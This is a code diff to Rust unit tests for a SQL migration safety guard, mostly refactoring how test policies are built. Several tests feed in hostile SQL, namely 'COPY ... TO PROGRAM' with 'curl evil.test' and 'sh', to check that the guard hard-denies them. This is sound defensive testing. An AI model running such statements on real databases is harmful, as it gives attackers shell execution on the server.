@@ -3559,12 +3559,15 @@ mod tests {
     };
 
     fn guard_cfg() -> GuardConfig {
-        GuardConfig::confined("proj_acme")
+        GuardConfig::from_policy(
+            crate::test_fixtures::no_inject("proj_acme"),
+            crate::SqlDialect::Postgres,
+        )
     }
 
     #[test]
     fn declarative_plan_rejects_a_different_apply_policy() {
-        let effective = crate::zeroship_confined_ceiling();
+        let effective = crate::test_fixtures::confined_charter();
         let plan = DeclarativeDeployPlan {
             plain: MigrationPlan {
                 items: Vec::new(),
@@ -3579,7 +3582,7 @@ mod tests {
 
         assert!(plan.verify_effective_policy(&effective).is_ok());
         assert!(matches!(
-            plan.verify_effective_policy(&crate::zeroship_no_inject_ceiling()),
+            plan.verify_effective_policy(&crate::test_fixtures::no_inject("app")),
             Err(EngineError::DeclarativePolicyMismatch)
         ));
     }
@@ -3671,7 +3674,7 @@ mod tests {
 
     #[test]
     fn plan_with_a_drop_is_destructive_and_requires_approval() {
-        let drop = RawSqlAuthor::new("proj_acme", "app_acme")
+        let drop = RawSqlAuthor::new("app_acme", crate::test_fixtures::no_inject("proj_acme"))
             .wrap("drop_legacy", "DROP TABLE \"proj_acme\".\"legacy\"", None)
             .unwrap();
         let plan = MigrationEngine::new().plan(&[drop], &guard_cfg());
@@ -3685,7 +3688,7 @@ mod tests {
     #[test]
     fn plan_with_a_dangerous_up_records_a_denial() {
         // COPY … TO PROGRAM is shell RCE — hard-denied (not merely flagged).
-        let evil = RawSqlAuthor::new("proj_acme", "app_acme")
+        let evil = RawSqlAuthor::new("app_acme", crate::test_fixtures::no_inject("proj_acme"))
             .wrap(
                 "rce",
                 "COPY \"proj_acme\".\"t\" TO PROGRAM 'curl evil.test'",
@@ -3705,7 +3708,7 @@ mod tests {
 
     #[test]
     fn plan_collects_every_denial_not_just_the_first() {
-        let raw = RawSqlAuthor::new("proj_acme", "app_acme");
+        let raw = RawSqlAuthor::new("app_acme", crate::test_fixtures::no_inject("proj_acme"));
         let a = raw
             .wrap("rce", "COPY \"proj_acme\".\"t\" TO PROGRAM 'sh'", None)
             .unwrap();
